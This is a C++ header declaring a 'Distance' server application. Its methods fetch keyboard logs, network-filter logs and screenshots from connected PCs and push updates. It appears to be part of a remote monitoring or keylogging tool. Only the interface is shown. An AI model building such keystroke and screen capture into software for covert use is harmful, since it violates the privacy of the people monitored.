#ifndef _DISTANCE_SERVER_APP_HPP_
#define _DISTANCE_SERVER_APP_HPP_

#include <iostream>
#include <cwctype>
#include <cassert>
#include <codecvt>

#include "TcpSyncServer.hpp"
#include "ServerConfigurator.hpp"

#include "ComputerInfo.hpp"
#include "named_pipe.hpp"

namespace Distance
{

    struct Package
    {
        char* buffer;
        size_t numberOfBytes;
    };



    class ServerApp
    {
    public:
        ServerApp(const ServerApp&) = delete;
        void operator=(const ServerApp&) = delete;

        static ServerApp* create();
        void run();

    private:
        ServerApp() = default;

        std::string connectToPc(
            std::vector<TcpServerSettings>::const_reference address
        );

        Package getKeyboardLog();
        Package getNetfilterLog();
        Package getScreenshot();
        Package processUpdate();
        void processTerminate(size_t bytesForSend) const;

    private:
        boost::asio::io_context ioContext_;
        std::unique_ptr<char[]> mainBuffer_;

        std::unique_ptr<TcpSyncServer> server_;
        static ServerApp* app_;

        enum
        {
            MainBufferSize = 1024u * 1024u * 35u
        };
    };

} // namespace Distance
#endif // _DISTANCE_SERVER_APP_HPP_